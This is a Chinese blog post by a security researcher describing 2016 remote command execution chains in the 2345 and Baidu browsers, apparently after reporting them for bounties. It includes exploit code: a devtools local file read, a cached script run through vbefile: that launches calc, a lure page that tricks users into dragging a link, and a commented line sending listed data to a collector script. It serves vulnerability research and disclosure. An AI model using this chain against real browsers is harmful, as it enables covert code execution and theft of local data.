@@ -1,0 +1,157 @@
+---
+layout:		post
+title:		那些年我搞过的两个浏览器
+subtitle:	弹个计算器
+data:		2016-10-18
+author:		"dogewatch"
+header-img:	"img/home-bg-o.jpg"
+tags:
+    - web
+---
+
+> web狗也能弹计算器
+
+# 前言
+
+那是一个乌云还在的日子，某天正逛着逛着的时候，突然发现了这么一个洞：[QQ浏览器9本地文件读取&远程命令执行](http://wooyun.org/bugs/wooyun-2016-0176314.html)，一瞬间就像看到了一扇通往新世界的大门一样，原来web狗也能弹计算器！看完后就开始尝试自己去挖一些浏览器的漏洞，也挖出过两个浏览器的命令执行，这里做个小小的总结。
+
+# 2345浏览器
+
+虽然用浏览器来命令执行的方式有很多，但是作为一个web选手，所会的只是利用某些漏洞往本地写脚本命令，然后用`vbefile:`协议来执行这个脚本文件了。
+
+## 背景漏洞
+
+### 0x00
+
+在某些版本的chrome浏览器中，存在这样一个漏洞。访问url：
+
+`chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://xxx.com/&remoteFrontend=true`
+
+浏览器就会加载执行xxx.com下的`screencast_module.js`文件。而在这个文件中，就有权限调用DevToolsAPI。利用向外部容器发送`loadNetWorkResource`就可以实现读取本地文件和列目录。实例代码如下：
+
+```javascript
+var data="";
+DevToolsAPI.streamWrite = function(id,chunk){
+  data += chunk;
+}
+DevToolsAPI.sendMessageToEmbedder(
+  "loadNetWorkResource",
+  ["file:///C:/Users","",0],
+  function(){
+    console.log(data);
+  }
+);
+```
+![img](/img/post/calc-1.png)
+
+## 构造exp
+
+想要让浏览器去执行脚本命令，需要这么几步：
+
+`向本地写脚本文件 -> 获取这个文件的绝对路径 -> 调用vbefile执行这个文件`
+
+### 0x01
+
+首先是写文件，这个简单，利用浏览器的cache机制，构造一定大小的页面，让浏览器把页面内容写入到cache目录中。cache目录在`chrome://version`中可以看到。这里2345浏览器的cache目录是`C:\Users\「你的用户名」\AppData\Local\2345Explorer\User Data\Default\Cache`，当页面大小在30k左右时就会生成一个独立的缓存文件了。
+
+### 0x02
+
+要执行这个文件，还需要解决的问题就是，获取这个文件的绝对路径值。可以看到绝对路径的大部分内容都是固定的，需要我们获取的就是用户名的值和写入的这个缓存文件的值。那么通过背景漏洞我们可以用列目录的方式来得到用户名和文件名。
+
+但是这里又有了一个新的问题，就是由于浏览器对特权域的保护，使得`location.href`、`window.open`或者iframe加载等方式都不能打开`chrome-devtools`域下的url，而让用户自己去填这个url到地址栏里打开又太不靠谱了，所以我们需要有一个跨域的办法。
+
+通常要跨到这种特权域有两种办法，一种是找到浏览器自带的某些特权api，这种api能访问指定的url地址，例如这个2345浏览器里的`chrome.ntp2345.prepareThumbnail`。还有一种办法就是利用该浏览器的跨域漏洞直接跨到`chrome-devtools`域。这两种办法各有自己的优缺点，第一种方式在找到这种api后，还需要找一个该api所在域的xss漏洞来执行这个api，而第二种方式则很难挖到。在这里我会采用第二种方式，利用一个所有的国产浏览器都存在且不重视的“小问题”来直接跨域访问。
+
+### 0x03 所有国产浏览器都忽略的一个“小问题”
+
+所有的国产浏览器都支持这样一个功能，就是鼠标点击一个链接后拖拽，则会在一个新标签页中打开这个url，而这个操作对url没有任何的限制，可以通过这种方式打开`file://`、`chrome://`、`chrome-devtools://`等url。chrome浏览器本身则不支持这种方式。所以这里我打算在链接上覆盖一张图片，通过诱使用户拖拽着张图片的方式来跨域访问目标url。
+
+### 0x04 
+
+进行到现在，能够写文件，能够得到文件的绝对路径，那么只需要在页面中加上一句js就能执行这个脚本里的命令了：
+
+```````javascript
+location.href='vbefile:../../../../../Users/'+uname+'/AppData/Local/2345Explorer/User Data/Default/Cache/'+fname+'" //E:jscript //B"';
+```````
+
+这里用到了二哥@gainover提供的一个小tips。因为缓存文件名没有.js后缀，所以需要带上`//E:jscript`来为其指定解析引擎，而`//B`是为了如果遇到错误，不让系统弹出错误提示框。
+
+弹个计算器(因为交了补天了，所以直接在上面扒个图)
+
+![img](/img/post/calc-2.png)
+
+# 百度浏览器
+
+利用方式跟上面那个差不多，所以就写到一篇博客里了。不同点在于，因为这个浏览器不存在devtools那个漏洞了，所以获取用户名就使用的是chajian.baidu.com域下的特权api`external.StartRequest`。
+
+![img](/img/post/calc-4.jpeg)
+
+至于跨到这个域下，则是使用了一个价值7500美刀的[uxss漏洞](https://bus.chromium.org/p/chromium/issues/detail?id=569496)。文件名那里的处理则换了种方式，因为缓存文件是按照一个固定格式生成的，而且数量有限，所以在不能列目录的情况下完全可以通过爆破文件名的方式来做到命令执行。
+
+![img](/img/post/calc-3.jpeg)
+
+# 部分利用代码
+
+缓存文件
+
+```html
+var r=new ActiveXObject("WScript.shell");
+			r.run("calc.exe");/*
+AAAAAAAAAAAA.............足够多的任意字符
+<script>location.href='http://127.0.0.1/2345/calc.htm';</script>*/
+```
+
+诱使用户拖拽图片页面
+
+```html
+<html>
+<div style="background:url('https://o4qgwtf0t.qnssl.com/wp-content/uploads/2016/06/69485935.jpg');z-index: 999;width:140px; height:140px;">
+<input readonly="readonly" style="width:140px;height:140px;border:none;background:none;border-style:none;text-indent:-9999px;outline:none;"
+type="text" value="chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/2345/screencast_module.php?&remoteFrontend=true" onclick="this.select();" onmousedown="this.select();">
+</html>
+```
+
+获取用户名和文件名的部分代码
+
+```javascript
+DevToolsAPI.sendMessageToEmbedder(
+    "loadNetworkResource",
+    [ "file:///C:/Users", "", 0 ],
+    function (result) {
+        //var x=new XMLHttpRequest();x.open("POST","http://127.0.0.1/2345/recv.php",true);x.send(data);
+        r1 = /(?:\<script\>addRow\(\")(.+?)(?:\")/g;
+        while(true){
+            try{
+                var uname = r1.exec(data)[1];
+                if(uname != '..' && uname != 'All Users' && uname != 'Default User' && uname != 'Public' && uname != 'desktop.ini' && uname != 'Default'){
+                    //console.log(uname);
+                    var filename = "";
+                    DevToolsAPI.streamWrite = function(id, chunk){
+                        filename += chunk;
+                    }
+                    DevToolsAPI.sendMessageToEmbedder(
+                    "loadNetworkResource",
+                    ["file://C:/Users/"+uname+"/AppData/Local/2345Explorer/User Data/Default/Cache", "", 0],
+                    function(){
+                        r2 = /(?:\<script\>addRow\(\")(.+?)(?:\".+,0,\"29\.4 kB\")/g;
+                        r3 = /(.+?)(?:\",)/g;
+                        while(true){
+                            try{
+                                var fname = r2.exec(filename)[1];
+                                location.href='vbefile:../../../../../Users/'+uname+'/AppData/Local/2345Explorer/User Data/Default/Cache/'+fname+'" //E:jscript //B"';
+                            }catch(e){break;}
+                        }
+                    }
+                    );
+                    break;
+                }
+                //console.log(r1.exec(data)[1]);
+            } catch (e){break;}
+        }
+    }
+);
+```
+
+# 后记
+
+挖这几个浏览器的洞是我目前见到的奖金最多的洞了，比审php高多了T_T。然而感觉还只是理解了皮毛，比如说那个uxss就没能理解原理。但愿有一天也能挖出chrome的洞，去挣挣美刀。
